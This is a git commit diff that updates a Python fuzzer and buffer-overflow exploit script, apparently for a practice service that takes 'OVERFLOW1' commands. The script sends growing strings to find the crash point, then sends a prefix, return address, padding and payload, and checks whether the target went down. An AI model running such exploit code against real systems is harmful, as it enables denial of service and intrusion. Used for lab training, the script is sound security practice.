3f3e00cf3647804644d97a17842cd3c14b7f39ed
Victor Fernandez III <48382964+cyberphor@users.noreply.github.com>
2021-05-01 18:07:27 -0600

    Update gbfuzzer.py

--- Code/gbfuzzer.py
+++ Code/gbfuzzer.py
@@ -7,26 +7,29 @@ import time
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--fuzz',action='store_true')
-parser.add_argument('--flood',action='store_true')
+parser.add_argument('--overflow',action='store_true')
 parser.add_argument('--host')
 parser.add_argument('--port',type=int)
-parser.add_argument('--timeout',type=int)
 args = parser.parse_args()
 
 ip = args.host
 port = args.port
 target = (ip,port)
-timeout = args.timeout
+timeout = 3
+
+def connect():
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    client.settimeout(timeout)
+    client.connect(target)
+    client.recv(1024)
+    return client
 
 def fuzz():
     prefix = "OVERFLOW1 "
     string = prefix + "A" * 100
     while True:
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
-                client.settimeout(timeout)
-                client.connect(target)
-                client.recv(1024)
+            with connect() as client:
                 print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
                 client.send(bytes(string, "latin-1"))
                 client.recv(1024)
@@ -40,7 +43,7 @@ def fuzz():
         string += 100 * "A"
         time.sleep(1)
 
-def flood():
+def overflow():
     prefix = "OVERFLOW1 "
     offset = 0
     overflow = "A" * offset
@@ -50,26 +53,27 @@ def flood():
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
 
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        client.connect(target)
+        client = connect()
         client.send(bytes(bof + "\r\n","latin-1"))
+        client.close()
         print("[+] Sent BOF.")
-        client.recv(1024)
+        try:
+            client = connect()
+            client.close()
+        except:
+            print("[+] Tango down!")
     except:
         print("[x] Failed to connect to port %d." % port)
 
 if __name__ == "__main__":
-    if not args.fuzz and not args.flood:
+    if not args.fuzz and not args.overflow:
         print("[x] Please specify an option using either --fuzz or --flood.")
     if not args.host:
         print("[x] Please specify a host using --host.")
     elif not args.port:
         print("[x] Please specify a port using --port.")
-    elif not args.timeout:
-        print("[x] Please specify a connection timeout using --timeout.")
-    
-    if args.fuzz:
+    elif args.fuzz:
         fuzz()
-    elif args.flood:
-        flood()
+    elif args.overflow:
+        overflow()
